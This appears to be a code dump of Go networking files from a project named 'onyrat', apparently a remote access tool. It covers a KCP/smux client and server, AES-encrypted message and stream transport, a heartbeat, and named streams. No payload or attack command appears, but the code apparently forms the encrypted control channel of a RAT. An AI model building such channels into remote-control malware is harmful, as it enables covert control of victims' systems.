+		return newStreamedEncryptedSender(stream, c.AESKey, timeout)
+
+	}
+}
+
+func (c *KCPClient) Receive(stream *smux.Stream, buf []byte, timeout time.Duration) error {
+	select {
+
+	case <-c.Ctx.Done():
+		return fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))
+
+	default:
+		return receive(stream, buf, timeout)
+
+	}
+}
+
+func (c *KCPClient) NewStreamedReceiver(stream *smux.Stream, timeout time.Duration) (io.ReadCloser, error) {
+	select {
+
+	case <-c.Ctx.Done():
+		return nil, fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))
+
+	default:
+		return newStreamedReceiver(stream, timeout), nil
+
+	}
+}
+
+func (c *KCPClient) ReceiveSerialized(stream *smux.Stream, buf []byte, timeout time.Duration) (uint64, error) {
+	select {
+
+	case <-c.Ctx.Done():
+		return 0, fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))
+
+	default:
+		return receiveSerialized(stream, buf, timeout)
+
+	}
+}
+
+func (c *KCPClient) ReceiveEncrypted(stream *smux.Stream, buf []byte, timeout time.Duration) (uint64, error) {
+	select {
+
+	case <-c.Ctx.Done():
+		return 0, fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))
+
+	default:
+		return receiveEncrypted(stream, buf, c.AESKey, timeout)
+
+	}
+}
+
+func (c *KCPClient) NewStreamedEncryptedReceiver(stream *smux.Stream, timeout time.Duration) (io.ReadCloser, error) {
+	select {
+
+	case <-c.Ctx.Done():
+		return nil, fmt.Errorf("connection closed: %w", context.Cause(c.Ctx))
+
+	default:
+		return newStreamedEncryptedReceiver(stream, c.AESKey, timeout)
+
+	}
+}
+
+```
+
+common.go — pkg\network\common.go
+```
+package network
+
+import (
+	"sync"
+	"time"
+
+	"github.com/xtaci/smux"
+)
+
+const (
+	// Stream name for heartbeat messages
+	heartbeatStream = "heartbeatStream"
+)
+
+// deadlineWriter sets a per-write dedline on the underlying stream.
+type deadlineWriter struct {
+	s   *smux.Stream
+	dur time.Duration
+}
+
+// Write writes bytes to the underlying stream with a timeout set by dur.
+func (w *deadlineWriter) Write(p []byte) (int, error) {
+	if w.dur > 0 {
+		_ = w.s.SetWriteDeadline(time.Now().Add(w.dur))
+	}
+	defer w.s.SetWriteDeadline(time.Time{})
+	return w.s.Write(p)
+}
+
+// Close closes the underlying stream.
+func (w *deadlineWriter) Close() error { return w.s.Close() }
+
+// deadlineReader sets a per-read deadline on the underlying stream.
+type deadlineReader struct {
+	s   *smux.Stream
+	dur time.Duration
+}
+
+// Read reads bytes from the underlying stream with a timeout set by dur.
+func (r *deadlineReader) Read(p []byte) (int, error) {
+	if r.dur > 0 {
+		_ = r.s.SetReadDeadline(time.Now().Add(r.dur))
+	}
+	defer r.s.SetReadDeadline(time.Time{})
+	return r.s.Read(p)
+}
+
+// Close closes the underlying stream.
+func (r *deadlineReader) Close() error { return r.s.Close() }
+
+// headerPool is a sync.Pool for reusable 8-byte buffers for length headers.
+var headerPool = sync.Pool{
+	New: func() any {
+		return make([]byte, 8)
+	},
+}
+
+```
+
+comms.go — pkg\network\comms.go
+```
+package network
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"encoding/binary"
+	"fmt"
+	"io"
+	"time"
+
+	"github.com/Onyz107/onyrat/internal/crypto"
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/xtaci/smux"
+)
+
+type Communicator interface {
+	// Raw send/receive
+	Send(stream *smux.Stream, data []byte, timeout time.Duration) error
+	Receive(stream *smux.Stream, buf []byte, timeout time.Duration) error
+
+	// Streamed send/receive
+	NewStreamedSender(stream *smux.Stream, timeout time.Duration) (io.WriteCloser, error)
+	NewStreamedReceiver(stream *smux.Stream, timeout time.Duration) (io.ReadCloser, error)
+
+	// Serialized send/receive
+	SendSerialized(stream *smux.Stream, data []byte, timeout time.Duration) error
+	ReceiveSerialized(stream *smux.Stream, buf []byte, timeout time.Duration) (uint64, error)
+
+	// Encrypted send/receive
+	SendEncrypted(stream *smux.Stream, data []byte, timeout time.Duration) error
+	ReceiveEncrypted(stream *smux.Stream, buf []byte, timeout time.Duration) (uint64, error)
+
+	// Streamed encrypted
+	NewStreamedEncryptedSender(stream *smux.Stream, timeout time.Duration) (io.WriteCloser, error)
+	NewStreamedEncryptedReceiver(stream *smux.Stream, timeout time.Duration) (io.ReadCloser, error)
+
+	// Close the communicator
+	Close() error
+}
+
+func send(stream *smux.Stream, data []byte, timeout time.Duration) error {
+	if timeout > 0 {
+		stream.SetDeadline(time.Now().Add(timeout))
+	}
+	defer stream.SetDeadline(time.Time{})
+
+	n, err := stream.Write(data)
+	if err != nil {
+		return fmt.Errorf("failed to send data: %w", err)
+	}
+	if n != len(data) {
+		return fmt.Errorf("sent %d bytes instead of %d", n, len(data))
+	}
+
+	return nil
+}
+
+func newStreamedSender(stream *smux.Stream, timeout time.Duration) io.WriteCloser {
+	return &deadlineWriter{s: stream, dur: timeout}
+}
+
+func sendSerialized(stream *smux.Stream, data []byte, timeout time.Duration) error {
+	length := uint64(len(data))
+	logger.Log.Debugf("Sending serialized data to client of length: %d", length)
+
+	header := headerPool.Get().([]byte)
+	defer headerPool.Put(header)
+
+	binary.BigEndian.PutUint64(header, length)
+
+	if err := send(stream, header, timeout); err != nil {
+		return fmt.Errorf("failed to send header to client: %w", err)
+	}
+
+	if err := send(stream, data, timeout); err != nil {
+		return fmt.Errorf("failed to send serialized data to client: %w", err)
+	}
+
+	return nil
+}
+
+func sendEncrypted(stream *smux.Stream, data, aesKey []byte, timeout time.Duration) error {
+	encData, err := crypto.EncryptAESGCM(aesKey, data)
+	if err != nil {
+		return fmt.Errorf("encryption failed: %w", err)
+	}
+
+	return sendSerialized(stream, encData, timeout)
+}
+
+func newStreamedEncryptedSender(stream *smux.Stream, aesKey []byte, timeout time.Duration) (io.WriteCloser, error) {
+	block, err := aes.NewCipher(aesKey)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create cipher: %w", err)
+	}
+
+	nonce := make([]byte, aes.BlockSize)
+	rand.Read(nonce)
+
+	streamWriter := newStreamedSender(stream, timeout)
+
+	if _, err := streamWriter.Write(nonce); err != nil {
+		return nil, fmt.Errorf("failed to send nonce: %w", err)
+	}
+
+	encryptedStreamWriter := &cipher.StreamWriter{
+		S: cipher.NewCTR(block, nonce),
+		W: streamWriter,
+	}
+
+	return encryptedStreamWriter, nil
+}
+
+func receive(stream *smux.Stream, buf []byte, timeout time.Duration) error {
+	if timeout > 0 {
+		stream.SetDeadline(time.Now().Add(timeout))
+	}
+	defer stream.SetDeadline(time.Time{})
+
+	if _, err := io.ReadFull(stream, buf); err != nil {
+		return fmt.Errorf("failed to receive data from client: %w", err)
+	}
+
+	return nil
+}
+
+func newStreamedReceiver(stream *smux.Stream, timeout time.Duration) io.ReadCloser {
+	return &deadlineReader{s: stream, dur: timeout}
+}
+
+func receiveSerialized(stream *smux.Stream, buf []byte, timeout time.Duration) (uint64, error) {
+	header := headerPool.Get().([]byte)
+	defer headerPool.Put(header)
+
+	if err := receive(stream, header, timeout); err != nil {
+		return 0, fmt.Errorf("failed to receive header from client: %w", err)
+	}
+
+	maxDataSize := uint64(cap(buf))
+
+	length := binary.BigEndian.Uint64(header)
+	if length > maxDataSize {
+		return 0, fmt.Errorf("data too large to receive got buffer with capacity of: %d received data with length of: %d", maxDataSize, length)
+	}
+	logger.Log.Debugf("Receiving serialized data from client with length of: %d", length)
+
+	data := buf[:length] // Allocate exactly length amount of bytes (this does not really allocate since we are slicing the slice but you get me)
+	if err := receive(stream, data, timeout); err != nil {
+		return 0, fmt.Errorf("failed to receive data from client: %w", err)
+	}
+
+	return length, nil
+}
+
+func receiveEncrypted(stream *smux.Stream, buf, aesKey []byte, timeout time.Duration) (uint64, error) {
+	n, err := receiveSerialized(stream, buf, timeout)
+	if err != nil {
+		return 0, err
+	}
+
+	data := buf[:n]
+
+	plaintext, err := crypto.DecryptAESGCM(aesKey, data)
+	if err != nil {
+		return 0, err
+	}
+
+	n = uint64(copy(buf[:len(plaintext)], plaintext))
+	return n, nil
+}
+
+func newStreamedEncryptedReceiver(stream *smux.Stream, aesKey []byte, timeout time.Duration) (io.ReadCloser, error) {
+	reader := newStreamedReceiver(stream, timeout)
+
+	nonce := make([]byte, aes.BlockSize)
+	if _, err := io.ReadFull(reader, nonce); err != nil {
+		return nil, fmt.Errorf("failed to read nonce: %w", err)
+	}
+
+	block, err := aes.NewCipher(aesKey)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create cipher: %w", err)
+	}
+
+	streamReader := &cipher.StreamReader{
+		S: cipher.NewCTR(block, nonce),
+		R: reader,
+	}
+
+	return struct {
+		io.Reader
+		io.Closer
+	}{streamReader, reader}, nil
+}
+
+```
+
+heartbeat.go — pkg\network\heartbeat.go
+```
+package network
+
+import (
+	"context"
+	"errors"
+	"fmt"
+	"time"
+
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/xtaci/smux"
+)
+
+type HeartbeatManager struct {
+	Communicator Communicator
+	Manager      *StreamManager
+	Ctx          context.Context
+	cancel       context.CancelCauseFunc
+	done         chan error
+}
+
+func (hm *HeartbeatManager) Run() {
+	inCtx, cancel := context.WithCancelCause(hm.Ctx)
+	hm.cancel = cancel
+	defer func() {
+		if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
+			hm.done <- fmt.Errorf("failed to run heartbeat: %w", err)
+		} else {
+			hm.done <- nil
+		}
+	}()
+	defer cancel(nil)
+
+	addr := hm.Manager.session.RemoteAddr().String()
+
+	var server *KCPServer
+	var client *KCPClient
+	var mode int = 1 // 0 client, 1 server
+	var ok bool
+
+	server, ok = hm.Communicator.(*KCPServer)
+	if !ok {
+		client, ok = hm.Communicator.(*KCPClient)
+		if !ok {
+			hm.cancel(fmt.Errorf("invalid communicator"))
+			return
+		}
+		mode = 0
+	}
+
+	if client == nil && server != nil {
+		client = server.GetClient(addr)
+		if client == nil {
+			cancel(fmt.Errorf("failed to get connection between client: %s", addr))
+			return
+		}
+	}
+
+	var stream *smux.Stream
+	var err error
+	if mode == 1 {
+		stream, err = client.Manager.AcceptStream(heartbeatStream, 10*time.Second)
+		if err != nil {
+			server.CloseClient(addr)
+			cancel(fmt.Errorf("failed to accept heartbeat stream from: %s: %w", addr, err))
+			return
+		}
+	} else {
+		stream, err = client.Manager.OpenStream(heartbeatStream, 10*time.Second)
+		if err != nil {
+			client.Close()
+			cancel(fmt.Errorf("failed to open heartbeat stream: %w", err))
+			return
+		}
+	}
+
+	ticker := time.NewTicker(15 * time.Second)
+	defer ticker.Stop()
+
+	sendClientMessage := []byte("ping")
+	sendServerMessage := []byte("pong")
+	disconnectMessage := []byte("diss")
+	buf := make([]byte, 12) // Accounting for serialization
+
+	for range ticker.C {
+		select {
+
+		case <-inCtx.Done():
+			if mode == 0 {
+				client.SendSerialized(stream, disconnectMessage, 15*time.Second)
+			} else {
+				server.SendSerialized(stream, disconnectMessage, 15*time.Second)
+			}
+			client.Close()
+			return
+
+		default:
+			if mode == 0 {
+				if err := client.SendSerialized(stream, sendClientMessage, 15*time.Second); err != nil {
+					client.Close()
+					cancel(fmt.Errorf("failed to send ping to server: %w", err))
+					return
+				}
+
+				// Receive pong
+				n, err := client.ReceiveSerialized(stream, buf, 15*time.Second)
+				if err != nil {
+					client.Close()
+					cancel(fmt.Errorf("failed to receive pong from the server: %w", err))
+					return
+				}
+
+				if string(buf[:n]) == "pong" {
+					logger.Log.Debug("Proof of life received from server.")
+					client.LastSeen = time.Now()
+					continue
+
+				} else if string(buf[:n]) == "diss" {
+					client.Close()
+					cancel(fmt.Errorf("disconnected by server"))
+					return
+
+				} else {
+					client.Close()
+					cancel(fmt.Errorf("unexpected message received from the server on the heartbeat stream: %x", buf[:n]))
+					return // return so we do not trigger sending disconnect mesage to server
+				}
+
+			} else {
+				n, err := server.ReceiveSerialized(stream, buf, 15*time.Second)
+				if err != nil {
+					server.CloseClient(addr)
+					cancel(fmt.Errorf("failed to receive ping from client: %s: %w", addr, err))
+					return
+				}
+
+				if string(buf[:n]) == "ping" {
+					logger.Log.Debugf("Proof of life received from client: %s", addr)
+					client.LastSeen = time.Now()
+
+					if err := server.SendSerialized(stream, sendServerMessage, 15*time.Second); err != nil {
+						client.Close()
+						cancel(fmt.Errorf("failed to send pong to client: %s: %w", addr, err))
+					}
+
+				} else if string(buf[:n]) == "diss" {
+					server.CloseClient(addr)
+					cancel(fmt.Errorf("disconnected by client: %s", addr))
+					return
+
+				} else {
+					server.CloseClient(addr)
+					cancel(fmt.Errorf("unexpected message received on the heartbeat stream from client: %s: %x", addr, buf[:n]))
+					return
+				}
+
+			}
+
+		}
+	}
+}
+
+func (hm *HeartbeatManager) Start() {
+	if hm.done == nil {
+		hm.done = make(chan error, 1)
+	}
+	go hm.Run()
+}
+
+func (hm *HeartbeatManager) Wait() error {
+	if hm.done != nil {
+		return <-hm.done
+	}
+	return fmt.Errorf("heartbeat manager not initialized")
+}
+
+func (hm *HeartbeatManager) Stop() {
+	if hm.cancel != nil {
+		hm.cancel(fmt.Errorf("stopped by user"))
+	}
+	hm.cancel = nil // Make nil so we do not error if Stop is called again after being initialized only once
+}
+
+```
+
+server.go — pkg\network\server.go
+```
+package network
+
+import (
+	"context"
+	"fmt"
+	"io"
+	"sync"
+	"time"
+
+	"github.com/xtaci/kcp-go/v5"
+	"github.com/xtaci/smux"
+)
+
+type KCPServer struct {
+	Listener *kcp.Listener
+	Ctx      context.Context
+	cancel   context.CancelCauseFunc
+	clients  map[string]*KCPClient
+	mu       sync.RWMutex
+}
+
+func NewServer(addr string, ctx context.Context) (*KCPServer, error) {
+	inCtx, cancel := context.WithCancelCause(ctx)
+
+	conn, err := kcp.ListenWithOptions(addr, nil, 0, 0)
+	if err != nil {
+		cancel(fmt.Errorf("failed to listen on %s: %w", addr, err))
+		return nil, fmt.Errorf("failed to listen on %s: %w", addr, err)
+	}
+
+	server := &KCPServer{
+		Listener: conn,
+		Ctx:      inCtx,
+		cancel:   cancel,
+		clients:  make(map[string]*KCPClient),
+	}
+
+	return server, nil
+}
+
+func (s *KCPServer) AcceptClient() (string, error) {
+	inCtx, cancel := context.WithCancelCause(s.Ctx)
+
+	conn, err := s.Listener.AcceptKCP()
+	if err != nil {
+		cancel(fmt.Errorf("failed to accept client: %w", err))
+		return "", fmt.Errorf("failed to accept client: %w", err)
+	}
+
+	// Performance optimizations
+	conn.SetWindowSize(512, 512)
+	conn.SetNoDelay(1, 40, 2, 1)
+
+	sess, err := smux.Server(conn, nil)
+	if err != nil {
+		cancel(fmt.Errorf("failed to create a session: %w", err))
+		return "", fmt.Errorf("failed to create a session: %w", err)
+	}
+	streamMan := NewStreamManager(sess)
+
+	client := &KCPClient{
+		Sess:     conn,
+		LastSeen: time.Now(),
+		ID:       len(s.clients),
+		Manager:  streamMan,
+		Ctx:      inCtx,
+		cancel:   cancel,
+	}
+
+	s.mu.Lock()
+	s.clients[conn.RemoteAddr().String()] = client
+	s.mu.Unlock()
+
+	return conn.RemoteAddr().String(), nil
+}
+
+func (s *KCPServer) GetClients() map[string]*KCPClient {
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+	return s.clients
+}
+
+func (s *KCPServer) GetClient(addr string) *KCPClient {
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+
+	client, ok := s.clients[addr]
+	if !ok {
+		return nil
+	}
+	return client
+}
+
+func (s *KCPServer) DisconnectClient(addr string) {
+	client := s.GetClient(addr)
+	if client == nil {
+		return
+	}
+
+	client.Disconnect()
+}
+
+func (s *KCPServer) CloseClient(addr string) {
+	client := s.GetClient(addr)
+	if client == nil {
+		return
+	}
+	s.mu.Lock()
+	delete(s.clients, addr)
+	s.mu.Unlock()
+	client.Close()
+}
+
+func (s *KCPServer) Close() error {
+	for addr := range s.GetClients() {
+		s.CloseClient(addr)
+	}
+	return s.Listener.Close()
+}
+
+func (s *KCPServer) Send(stream *smux.Stream, data []byte, timeout time.Duration) error {
+	select {
+
+	case <-s.Ctx.Done():
+		return fmt.Errorf("connection closed: %w", context.Cause(s.Ctx))
+
+	default:
+		return send(stream, data, timeout)
+
+	}
+}
+
+func (s *KCPServer) NewStreamedSender(stream *smux.Stream, timeout time.Duration) (io.WriteCloser, error) {
+	select {
+
+	case <-s.Ctx.Done():
+		return nil, fmt.Errorf("connection closed: %w", context.Cause(s.Ctx))
+
+	default:
+		return newStreamedSender(stream, timeout), nil
+
+	}
+}
+
+func (s *KCPServer) SendSerialized(stream *smux.Stream, data []byte, timeout time.Duration) error {
+	select {
+
+	case <-s.Ctx.Done():
+		return fmt.Errorf("connection closed: %w", context.Cause(s.Ctx))
+
+	default:
+		return sendSerialized(stream, data, timeout)
+
+	}
+}
+
+func (s *KCPServer) SendEncrypted(stream *smux.Stream, data []byte, timeout time.Duration) error {
+	addr := stream.RemoteAddr().String()
+	client := s.GetClient(addr)
+
+	select {
+
+	case <-s.Ctx.Done():
+		return fmt.Errorf("connection closed: %w", context.Cause(s.Ctx))
+
+	default:
+		return sendEncrypted(stream, data, client.AESKey, timeout)
+
+	}
+}
+
+func (s *KCPServer) NewStreamedEncryptedSender(stream *smux.Stream, timeout time.Duration) (io.WriteCloser, error) {
+	addr := stream.RemoteAddr().String()
+	client := s.GetClient(addr)
+
+	select {
+
+	case <-s.Ctx.Done():
+		return nil, fmt.Errorf("connection closed: %w", context.Cause(s.Ctx))
+
+	default:
+		return newStreamedEncryptedSender(stream, client.AESKey, timeout)
+
+	}
+}
+
+func (s *KCPServer) Receive(stream *smux.Stream, buf []byte, timeout time.Duration) error {
+	select {
+
+	case <-s.Ctx.Done():
+		return fmt.Errorf("connection closed: %w", context.Cause(s.Ctx))
+
+	default:
+		return receive(stream, buf, timeout)
+
+	}
+}
+
+func (s *KCPServer) NewStreamedReceiver(stream *smux.Stream, timeout time.Duration) (io.ReadCloser, error) {
+	select {
+
+	case <-s.Ctx.Done():
+		return nil, fmt.Errorf("connection closed: %w", context.Cause(s.Ctx))
+
+	default:
+		return newStreamedReceiver(stream, timeout), nil
+
+	}
+}
+
+func (s *KCPServer) ReceiveSerialized(stream *smux.Stream, buf []byte, timeout time.Duration) (uint64, error) {
+	select {
+
+	case <-s.Ctx.Done():
+		return 0, fmt.Errorf("connection closed: %w", context.Cause(s.Ctx))
+
+	default:
+		return receiveSerialized(stream, buf, timeout)
+
+	}
+}
+
+func (s *KCPServer) ReceiveEncrypted(stream *smux.Stream, buf []byte, timeout time.Duration) (uint64, error) {
+	addr := stream.RemoteAddr().String()
+	client := s.GetClient(addr)
+
+	select {
+
+	case <-s.Ctx.Done():
+		return 0, fmt.Errorf("connection closed: %w", context.Cause(s.Ctx))
+
+	default:
+		return receiveEncrypted(stream, buf, client.AESKey, timeout)
+
+	}
+}
+
+func (s *KCPServer) NewStreamedEncryptedReceiver(stream *smux.Stream, timeout time.Duration) (io.ReadCloser, error) {
+	addr := stream.RemoteAddr().String()
+	client := s.GetClient(addr)
+
+	select {
+
+	case <-s.Ctx.Done():
+		return nil, fmt.Errorf("connection closed: %w", context.Cause(s.Ctx))
+
+	default:
+		return newStreamedEncryptedReceiver(stream, client.AESKey, timeout)
+
+	}
+}
+
+```
+
+streamutil.go — pkg\network\streamutil.go
+```
+package network
+
+import (
+	"fmt"
+	"sync"
+	"time"
+
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/xtaci/smux"
+)
+
+// StreamManager wraps a smux.Session to make Open/Accept thread-safe
+type StreamManager struct {
+	session *smux.Session
+}
+
+const (
+	okName  = 1
+	errName = 0
+)
+
+var confirmPool = sync.Pool{
+	New: func() any {
+		return make([]byte, 1)
+	},
+}
+
+func NewStreamManager(sess *smux.Session) *StreamManager {
+	return &StreamManager{
+		session: sess,
+	}
+}
+
+// OpenStream opens a named stream and waits for server acknowledgment
+func (m *StreamManager) OpenStream(name string, timeout time.Duration) (*smux.Stream, error) {
+	logger.Log.Debugf("Opening stream with name: %s", name)
+	buf := confirmPool.Get().([]byte)
+	defer confirmPool.Put(buf)
+
+	for {
+		stream, err := m.session.OpenStream()
+		if err != nil {
+			return nil, err
+		}
+		logger.Log.Debugf("Stream opened, sending name: %s", name)
+
+		if timeout > 0 {
+			stream.SetDeadline(time.Now().Add(timeout))
+		}
+
+		_, err = stream.Write([]byte(name))
+		if err != nil {
+			stream.Close()
+			return nil, err
+		}
+
+		_, err = stream.Read(buf)
+		if err != nil {
+			stream.Close()
+			return nil, err
+		}
+
+		logger.Log.Debugf("Received acknowledgment: %s", string(buf))
+		if string(buf) == fmt.Sprint(okName) {
+			stream.SetDeadline(time.Time{})
+			logger.Log.Debugf("Stream accepted by server: %s", name)
+			return stream, nil
+		}
+
+		// server rejected the stream, retry
+		stream.Close()
+		logger.Log.Debugf("Stream rejected by server, retrying: %s", name)
+	}
+}
+
+// AcceptStream accepts a named stream from the client
+func (m *StreamManager) AcceptStream(name string, timeout time.Duration) (*smux.Stream, error) {
+	logger.Log.Debugf("Waiting to accept stream with name: %s", name)
+	buf := make([]byte, len(name))
+
+	for {
+		stream, err := m.session.AcceptStream()
+		if err != nil {
+			return nil, err
+		}
+
+		if timeout > 0 {
+			stream.SetDeadline(time.Now().Add(timeout))
+		}
+
+		_, err = stream.Read(buf)
+		if err != nil {
+			stream.Close()
+			return nil, err
+		}
+
+		receivedName := string(buf)
+		logger.Log.Debugf("Received stream name: %s", receivedName)
+
+		if receivedName == name {
+			logger.Log.Debugf("Stream name matches, sending OK")
+			_, err = fmt.Fprint(stream, okName)
+			if err != nil {
+				stream.Close()
+				return nil, err
+			}
+
+			stream.SetDeadline(time.Time{})
+			return stream, nil
+		} else {
+			logger.Log.Debug("Stream name mismatch, sending ERR and closing stream")
+			_, _ = fmt.Fprint(stream, errName)
+			stream.Close()
+		}
+	}
+}
+
+```
+
